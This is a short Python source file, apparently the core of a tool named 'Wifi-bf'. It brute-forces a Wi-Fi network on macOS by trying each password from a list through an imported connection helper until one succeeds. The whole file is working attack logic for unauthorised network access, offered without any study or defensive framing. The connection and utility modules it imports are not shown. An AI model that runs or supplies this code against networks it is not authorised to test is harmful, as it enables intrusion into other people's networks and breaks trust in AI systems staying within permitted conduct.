from connect import connect_to_wifi_macos
from util import bcolors
import time

def brute_force(selected_network, passwords, args):
    print("\nWifi-bf is running")

    for password in passwords:
        password = password.strip()

        if isinstance(password, str):
            decoded_line = password
        else:
            decoded_line = password.decode("utf-8")

        if args.verbose:
            print(f"{bcolors.HEADER}** TESTING **: with password '{decoded_line}'{bcolors.ENDC}")

        if len(decoded_line) >= 8:
            success, message = connect_to_wifi_macos(selected_network, decoded_line)

            if success:
                print(f"{bcolors.OKGREEN}** KEY FOUND! **: password '{decoded_line}' succeeded.{bcolors.ENDC}")
                return True
            else:
                if args.verbose:
                    print(f"{bcolors.FAIL}** TESTING **: password '{decoded_line}' failed.{bcolors.ENDC}")
                    print(f"{bcolors.VERBOSEGRAY}{message}{bcolors.ENDC}")

                time.sleep(1)
        else:
            if args.verbose:
                print(f"{bcolors.OKCYAN}** TESTING **: password '{decoded_line}' too short, passing.{bcolors.ENDC}")

    print(f"{bcolors.FAIL}** RESULTS **: All passwords failed :({bcolors.ENDC}")
    return False